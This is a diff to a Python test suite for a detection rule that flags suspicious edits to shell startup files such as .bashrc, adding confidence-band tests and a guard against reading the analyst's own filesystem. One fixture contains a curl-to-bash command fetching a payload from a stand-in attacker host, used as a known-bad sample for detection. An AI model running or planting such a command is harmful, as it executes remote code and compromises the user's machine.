@@ -355,12 +355,12 @@ def test_rule_shell_rc_modification_detects_bad(tmp_path):
     recent_mtime = time.time() - 3600  # 1 hour ago
     os.utime(bashrc, (recent_mtime, recent_mtime))
 
-    artifacts = {"env_definitions": [{
+    artifacts = {"shell_init_files": [{
         "owner": "alice",
         "source": str(bashrc),
-        "variable": "PATH",
-        "value": "/usr/local/bin:$PATH",
-        "raw_line": "export PATH=/usr/local/bin:$PATH",
+        "mtime": recent_mtime,
+        "ctime": time.time() - 400 * 24 * 3600,
+        "content": "export PATH=/usr/local/bin:$PATH\n",
     }]}
     findings = rule_shell_rc_modification(artifacts)
     assert len(findings) == 1
@@ -425,9 +425,9 @@ def test_rule_shell_rc_modification_deduplicates(tmp_path):
     recent_mtime = time.time() - 3600
     os.utime(bashrc, (recent_mtime, recent_mtime))
 
-    artifacts = {"env_definitions": [
-        {"owner": "alice", "source": str(bashrc), "variable": "A", "value": "1", "raw_line": "export A=1"},
-        {"owner": "alice", "source": str(bashrc), "variable": "B", "value": "2", "raw_line": "export B=2"},
+    artifacts = {"shell_init_files": [
+        {"owner": "alice", "source": str(bashrc), "mtime": recent_mtime,
+         "ctime": time.time() - 400 * 24 * 3600, "content": "export A=1\nexport B=2\n"},
     ]}
     findings = rule_shell_rc_modification(artifacts)
     assert len(findings) == 1
@@ -435,6 +435,46 @@ def test_rule_shell_rc_modification_deduplicates(tmp_path):
 
 def test_rule_shell_rc_modification_empty_artifacts():
     assert rule_shell_rc_modification({}) == []
+
+
+def _rc_file_entry(owner="alice", source="/home/alice/.bashrc", mtime=None, ctime=None,
+                    content="export PATH=$PATH:/usr/local/bin\n"):
+    now = time.time()
+    return {
+        "owner": owner, "source": source,
+        "mtime": mtime if mtime is not None else now - 3600,
+        "ctime": ctime if ctime is not None else now - 400 * 24 * 3600,
+        "content": content,
+    }
+
+
+def test_shell_rc_rule_bare_touch_is_low_confidence():
+    findings = rule_shell_rc_modification({"shell_init_files": [_rc_file_entry()]})
+    assert len(findings) == 1
+    assert findings[0].confidence_band == "LOW"
+
+
+def test_shell_rc_rule_curl_to_shell_is_high_confidence():
+    entry = _rc_file_entry(
+        content="curl http://evil.example/payload.sh | bash\n",
+        ctime=time.time() - 3600,
+    )
+    findings = rule_shell_rc_modification({"shell_init_files": [entry]})
+    assert len(findings) == 1
+    assert findings[0].confidence_band == "HIGH"
+    signal_names = {s["name"] for s in findings[0].signals}
+    assert "content_match" in signal_names
+    assert "ctime_corroborates_mtime" in signal_names
+
+
+def test_shell_rc_rule_never_reads_the_analyst_filesystem(tmp_path, monkeypatch):
+    # Regression guard for the os.stat-bypass bug: the rule must derive
+    # everything from the artifacts dict, never touch the real filesystem.
+    def _boom(*a, **kw):
+        raise AssertionError("rule_shell_rc_modification must not call os.stat")
+    monkeypatch.setattr("os.stat", _boom)
+    findings = rule_shell_rc_modification({"shell_init_files": [_rc_file_entry()]})
+    assert len(findings) == 1
 
 
 # ---------------------------------------------------------------------------
@@ -606,8 +646,9 @@ def test_shell_rc_modification_has_guided_remediation(tmp_path):
     rc = tmp_path / ".bashrc"
     rc.write_text("export PATH=$PATH\n")
     os.utime(str(rc), (time.time(), time.time()))
-    artifacts = {"env_definitions": [
-        {"owner": "alice", "source": str(rc), "variable": "PATH", "value": "x"}]}
+    artifacts = {"shell_init_files": [
+        {"owner": "alice", "source": str(rc), "mtime": time.time(),
+         "ctime": time.time() - 400 * 24 * 3600, "content": "export PATH=$PATH\n"}]}
     findings = rule_shell_rc_modification(artifacts)
     assert findings[0].remediation_available is False
     assert str(rc) in findings[0].guided_remediation
